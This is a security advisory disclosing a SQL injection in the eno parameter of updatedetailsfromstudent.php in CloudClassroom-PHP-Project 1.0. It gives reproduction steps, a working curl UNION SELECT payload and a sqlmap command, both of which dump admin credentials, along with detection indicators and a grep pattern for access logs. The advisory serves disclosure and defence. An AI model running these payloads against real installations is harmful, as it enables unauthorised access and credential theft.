# Security Advisory — SQL Injection in updatedetailsfromstudent.php (parameter eno)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-28**
...
A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **updatedetailsfromstudent.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require student session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `eno` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 11 columns. Confirmed with unauthenticated admin credential dump.
...
| Component: updatedetailsfromstudent.php | 1.0 | None | Affected |
...
The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **updatedetailsfromstudent.php**.
...
1. Request `updatedetailsfromstudent.php` with `eno` containing UNION payload (no cookie — item 00).
2. Adjust column count to 11 (target table) and position data in displayed column.
3. Read admin credentials reflected in response.
4. Automate with sqlmap (`-p eno`) for full database dump.
...
Parameter(s): eno
Method: GET (+POST on UPDATE) · Authentication: None (via Broken Access Control — item 00; design would require student session)
```

### Example Request

```http
POST /updatedetailsfromstudent.php HTTP/1.1
...
![Web execution evidence — 28-updatedetailsfromstudent-sqli](evidencia-web-28-updatedetailsfromstudent-sqli.png)

**b) Vulnerable code line** (`updatedetailsfromstudent.php`):

![Source code evidence — 28-updatedetailsfromstudent-sqli](evidencia-codigo-28-updatedetailsfromstudent-sqli.png)
...
```bash
curl -s -G "http://192.168.95.131:9292/updatedetailsfromstudent.php" \
  --data-urlencode "eno=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9,10,11 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/updatedetailsfromstudent.php?eno=1" -p eno --batch --dump -T admin
```
...
3. Access the component **updatedetailsfromstudent.php** (parameter(s): eno).
...
- Requests to `updatedetailsfromstudent.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `eno`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "updatedetailsfromstudent.php"
```
